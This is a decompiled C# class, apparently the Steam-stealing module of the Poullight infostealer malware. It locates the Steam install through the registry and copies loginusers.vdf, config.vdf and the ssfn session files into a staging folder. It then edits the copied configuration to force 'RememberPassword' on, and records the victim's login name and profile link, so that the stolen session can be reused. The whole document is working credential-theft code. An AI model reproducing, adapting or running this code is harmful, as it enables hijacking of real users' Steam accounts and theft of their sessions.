using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using Poullight.Properties;

// Token: 0x02000013 RID: 19
internal class Steam
{
	// Token: 0x0600002D RID: 45 RVA: 0x000044D4 File Offset: 0x000026D4
	protected static void err()
	{
		File.WriteAllText(string.Format("{0}\\Steam\\data.txt", global::Buffer.path_l), string.Format("{0}", global::Buffer.head));
		global::Buffer.XBufferData[6] = "0";
	}

	// Token: 0x0600002E RID: 46 RVA: 0x00004508 File Offset: 0x00002708
	protected static void cfgfix(string login, string config, string username)
	{
		if (File.Exists(login) && File.Exists(config))
		{
			try
			{
				string contents = File.ReadAllText(login, Encoding.GetEncoding("Windows-1251")).Replace("\"RememberPassword\"\t\t\"0\"", "\"RememberPassword\"\t\t\"1\"").Replace("\"mostrecent\"\t\t\"0\"", "\"mostrecent\"\t\t\"1\"");
				string data = File.ReadAllText(config, Encoding.GetEncoding(1251));
				try
				{
					if (File.Exists(login))
					{
						File.Delete(login);
					}
				}
				catch
				{
				}
				try
				{
					if (File.Exists(config))
					{
						File.Delete(config);
					}
				}
				catch
				{
				}
				string newValue = Exporter.Export("\"MTBF\"\t\t\"", "\"", data);
				string text = "\"Accounts\"" + Exporter.Export("\"Accounts\"", "\t\t\t\t\t}\n\t\t\t\t}", data) + "\t\t\t\t\t}\n\t\t\t\t}";
				string newValue2 = "\"ConnectCache\"" + Exporter.Export("\"ConnectCache\"", "\t\t\t\t}", data) + "\t\t\t\t}";
				File.WriteAllText(login, contents, Encoding.GetEncoding(1251));
				File.WriteAllText(config, Encoding.UTF8.GetString(Resources.SteamCfg).Replace("{$MTBF}", newValue).Replace("{$Accounts}", text).Replace("{$ConnectCache}", newValue2), Encoding.GetEncoding("Windows-1251"));
				File.WriteAllText(string.Format("{0}Steam\\Ссылка на аккаунт.txt", global::Buffer.path_l), "https://steamcommunity.com/profiles/" + Exporter.Export("\"SteamID\"\t\t\"", "\"", Exporter.Export(username, "}", text)).Replace("\"", ""), Encoding.GetEncoding(1251));
			}
			catch
			{
			}
		}
	}

	// Token: 0x0600002F RID: 47 RVA: 0x000046DC File Offset: 0x000028DC
	public static bool Start()
	{
		string text = string.Format("{0}Steam", global::Buffer.path_l);
		string text2 = null;
		RegistryKey registryKey = null;
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		try
		{
			registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
			text2 = registryKey.GetValue("SteamPath").ToString().Replace("/", "\\");
		}
		catch
		{
			Steam.err();
			return false;
		}
		if (!string.IsNullOrEmpty(text2) && registryKey != null && Directory.Exists(text2))
		{
			string text3 = null;
			if (string.IsNullOrEmpty(registryKey.GetValue("AutoLoginUser").ToString()))
			{
				Steam.err();
				return false;
			}
			text3 = registryKey.GetValue("AutoLoginUser").ToString();
			if (Directory.Exists(text2 + "/config"))
			{
				string[] files = Directory.GetFiles(text2 + "/config", "*.vdf");
				string[] files2 = Directory.GetFiles(text2, "ssfn*");
				if (files.Length != 0)
				{
					foreach (string text4 in files)
					{
						try
						{
							string fileName = Path.GetFileName(text4);
							if (fileName.ToLower() == "loginusers.vdf" || fileName.ToLower() == "config.vdf")
							{
								File.Copy(text4, text + "/" + fileName, true);
							}
						}
						catch
						{
						}
					}
					if (files2.Length != 0)
					{
						foreach (string text5 in files2)
						{
							try
							{
								string fileName = Path.GetFileName(text5);
								File.SetAttributes(text5, FileAttributes.Normal);
								File.Copy(text5, text + "/" + fileName, true);
							}
							catch
							{
							}
						}
						try
						{
							Steam.cfgfix(text + "/loginusers.vdf", text + "/config.vdf", text3);
						}
						catch
						{
						}
						File.WriteAllText(text + "/AccountLogin.TXT", text3);
					}
					global::Buffer.XBufferData[6] = "1";
					return true;
				}
			}
		}
		Steam.err();
		return false;
	}
}
